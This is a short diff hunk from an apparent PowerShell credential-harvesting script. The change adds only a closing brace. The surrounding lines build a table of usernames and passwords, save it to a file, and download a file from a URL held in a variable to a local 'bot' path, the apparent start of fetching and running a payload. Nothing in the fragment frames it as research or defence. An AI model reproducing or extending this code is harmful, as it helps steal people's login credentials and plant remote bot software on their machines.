@@ -97,6 +97,7 @@ if ($usernames.Count -eq $passwords.Count) {
             Password = $passwords[$i]
         }
     }
+}
 $credentialsTable | Format-Table -AutoSize | Out-File -FilePath $outputFilePath
 Invoke-WebRequest -Uri $boturl -OutFile $botpath
 if (Test-Path $botpath) {
